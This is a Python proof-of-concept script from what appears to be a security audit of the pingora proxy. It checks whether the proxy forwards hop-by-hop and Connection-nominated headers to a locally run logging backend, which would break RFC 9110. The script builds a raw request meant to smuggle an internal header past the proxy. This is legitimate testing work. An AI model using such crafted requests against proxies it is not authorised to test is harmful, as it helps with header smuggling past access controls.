#!/usr/bin/env python3
"""
Finding 5 PoC: Hop-by-hop headers forwarded in H1→H1 proxying.

This script can run in three modes:
  - backend: Start a simple HTTP backend that logs all received headers
  - client: Send requests with hop-by-hop headers through the proxy
  - test: Run the full test (backend + client + verification)

Usage:
    # Mode 1: Run backend and client separately
    python3 repro_hop_by_hop.py --mode backend --backend-port 8081
    python3 repro_hop_by_hop.py --mode client --target 127.0.0.1 --port 6188

    # Mode 2: All-in-one test
    python3 repro_hop_by_hop.py --mode test --proxy-port 6188 --backend-port 8081
"""

import argparse
import json
import socket
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler


# Headers that should be stripped by a compliant proxy (RFC 9110 §7.6.1)
HOP_BY_HOP_HEADERS = [
    "Connection",
    "Keep-Alive",
    "Proxy-Connection",
    "TE",
    "Transfer-Encoding",
    "Upgrade",
]


class HeaderLoggingHandler(BaseHTTPRequestHandler):
    """HTTP handler that logs all received headers and returns them as JSON."""

    received_headers = []

    def do_GET(self):
        headers = dict(self.headers)
        HeaderLoggingHandler.received_headers.append(headers)

        response = json.dumps(headers, indent=2).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(response)))
        self.end_headers()
        self.wfile.write(response)

    def log_message(self, format, *args):
        """Custom log format showing all headers."""
        print(f"  [Backend] {self.requestline}")
        for key, value in self.headers.items():
            marker = " [HOP-BY-HOP!]" if key in HOP_BY_HOP_HEADERS else ""
            print(f"    {key}: {value}{marker}")


def run_backend(port: int):
    """Start the header-logging backend server."""
    server = HTTPServer(("127.0.0.1", port), HeaderLoggingHandler)
    print(f"[Backend] Listening on 127.0.0.1:{port}")
    server.serve_forever()


def send_test_request(host: str, port: int) -> bytes:
    """Send a request with hop-by-hop headers through the proxy."""
    request = (
        b"GET /test HTTP/1.1\r\n"
        b"Host: backend.example.com\r\n"
        b"Connection: keep-alive, X-Secret-Internal\r\n"
        b"Keep-Alive: timeout=999\r\n"
        b"Proxy-Connection: close\r\n"
        b"TE: trailers\r\n"
        b"Upgrade: websocket\r\n"
        b"X-Secret-Internal: this-should-be-stripped\r\n"
        b"X-Normal-Header: this-should-pass-through\r\n"
        b"\r\n"
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    try:
        sock.connect((host, port))
        sock.sendall(request)
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        return response
    finally:
        sock.close()


def analyze_response(response: bytes) -> dict:
    """Parse the backend's JSON response showing which headers it received."""
    header_end = response.find(b"\r\n\r\n")
    if header_end == -1:
        print("[!] Could not parse response")
        return {}

    body = response[header_end + 4:]
    try:
        headers = json.loads(body)
    except json.JSONDecodeError:
        print(f"[!] Could not parse JSON body: {body[:200]}")
        return {}

    return headers


def run_client(host: str, port: int):
    """Send test requests and analyze results."""
    print(f"\n[Client] Sending request with hop-by-hop headers to {host}:{port}")
    print(f"[Client] Headers being sent:")
    print(f"    Connection: keep-alive, X-Secret-Internal")
    print(f"    Keep-Alive: timeout=999")
    print(f"    Proxy-Connection: close")
    print(f"    TE: trailers")
    print(f"    Upgrade: websocket")
    print(f"    X-Secret-Internal: this-should-be-stripped")
    print(f"    X-Normal-Header: this-should-pass-through")

    try:
        response = send_test_request(host, port)
    except ConnectionRefusedError:
        print(f"[!] Connection refused — is pingora running on {host}:{port}?")
        return

    headers = analyze_response(response)
    if not headers:
        return

    print(f"\n[Client] Headers received by backend:")
    leaked = []
    stripped = []

    for h in HOP_BY_HOP_HEADERS:
        h_lower = h.lower()
        found = any(k.lower() == h_lower for k in headers)
        if found:
            value = next(v for k, v in headers.items() if k.lower() == h_lower)
            leaked.append((h, value))
            print(f"    [LEAKED] {h}: {value}")
        else:
            stripped.append(h)
            print(f"    [OK]     {h}: (stripped)")

    # Check for Connection-nominated header
    if any(k.lower() == "x-secret-internal" for k in headers):
        print(f"    [LEAKED] X-Secret-Internal: (Connection-nominated header leaked!)")
        leaked.append(("X-Secret-Internal", "smuggled"))
    else:
        print(f"    [OK]     X-Secret-Internal: (Connection-nominated header stripped)")

    print(f"\n{'=' * 60}")
    print(f"Results: {len(leaked)} hop-by-hop headers LEAKED, {len(stripped)} stripped")
    if leaked:
        print(f"[!!] RFC 9110 §7.6.1 VIOLATION: hop-by-hop headers forwarded to upstream!")
    else:
        print(f"[OK] All hop-by-hop headers were properly stripped")


def run_test(proxy_port: int, backend_port: int):
    """Run the full test: start backend, send through proxy, verify."""
    print(f"Finding 5 PoC: Hop-by-Hop Header Forwarding")
    print(f"{'=' * 60}")
    print(f"Proxy: 127.0.0.1:{proxy_port}")
    print(f"Backend: 127.0.0.1:{backend_port}")

    # Start backend in background
    backend_thread = threading.Thread(
        target=run_backend, args=(backend_port,), daemon=True
    )
    backend_thread.start()
    time.sleep(0.5)  # Wait for backend to start

    # Send test request through proxy
    run_client("127.0.0.1", proxy_port)


def main():
    parser = argparse.ArgumentParser(
        description="PoC for hop-by-hop header forwarding in H1→H1 proxy mode"
    )
    parser.add_argument(
        "--mode",
        choices=["backend", "client", "test"],
        default="test",
        help="Run mode",
    )
    parser.add_argument("--target", default="127.0.0.1", help="Proxy host (client mode)")
    parser.add_argument("--port", type=int, default=6188, help="Proxy port (client mode)")
    parser.add_argument("--proxy-port", type=int, default=6188, help="Proxy port (test mode)")
    parser.add_argument("--backend-port", type=int, default=8081, help="Backend port")
    args = parser.parse_args()

    if args.mode == "backend":
        run_backend(args.backend_port)
    elif args.mode == "client":
        run_client(args.target, args.port)
    elif args.mode == "test":
        run_test(args.proxy_port, args.backend_port)


if __name__ == "__main__":
    main()
